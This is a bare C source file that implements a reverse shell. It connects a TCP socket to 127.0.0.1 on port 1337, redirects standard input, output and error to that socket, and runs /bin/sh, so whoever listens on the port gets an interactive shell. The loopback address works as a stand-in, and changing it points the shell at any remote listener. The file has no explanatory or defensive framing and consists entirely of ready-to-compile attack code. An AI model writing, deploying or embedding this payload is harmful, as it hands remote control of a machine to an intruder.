#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>


int main(int argc, char* argv[])
{

    struct sockaddr_in server;// = {0};

 
    int sock = socket(AF_INET, SOCK_STREAM, 0);

    server.sin_addr.s_addr = inet_addr("127.0.0.1");
    server.sin_family = AF_INET;
    server.sin_port = htons(1337);

    connect (sock, (struct sockaddr *)&server, sizeof(server));


    dup2 (sock, STDOUT_FILENO);
    dup2 (sock, STDERR_FILENO);
    dup2 (sock, STDIN_FILENO);
    char* arg[] = {NULL};
    execv("/bin/sh", arg);






    return 0;
}


